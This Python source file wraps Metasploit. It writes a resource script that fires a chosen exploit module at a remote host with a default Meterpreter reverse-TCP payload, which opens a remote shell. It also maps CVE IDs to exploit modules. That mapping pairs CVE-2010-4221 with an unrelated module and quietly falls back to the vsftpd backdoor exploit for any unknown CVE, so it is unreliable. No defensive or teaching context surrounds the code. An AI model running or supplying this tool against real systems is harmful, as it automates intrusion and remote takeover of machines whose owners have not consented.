import subprocess
import tempfile
import os

def run_msf_exploit(module_path, rhost, rport=80, lhost="127.0.0.1", lport="4444", payload="windows/meterpreter/reverse_tcp"):
    rc_script = f"""
use {module_path}
set RHOSTS {rhost}
set RPORT {rport}
set LHOST {lhost}
set LPORT {lport}
set PAYLOAD {payload}
exploit
"""
    with tempfile.NamedTemporaryFile(delete=False, suffix=".rc", mode="w") as script_file:
        script_file.write(rc_script)
        script_path = script_file.name

    try:
        result = subprocess.run(["msfconsole", "-q", "-r", script_path], capture_output=True, text=True, timeout=300)
        os.unlink(script_path)
        return result.stdout
    except Exception as e:
        return f"[Erreur d'ex√©cution Metasploit] {e}"


def get_exploit_for_cve(cve_id):
    cve_map = {
        "CVE-2011-2523": "exploit/unix/ftp/vsftpd_234_backdoor",
        "CVE-2010-4221": "exploit/unix/webapp/php_cgi_arg_injection"
    }
    return cve_map.get(cve_id.upper(), "exploit/unix/ftp/vsftpd_234_backdoor")
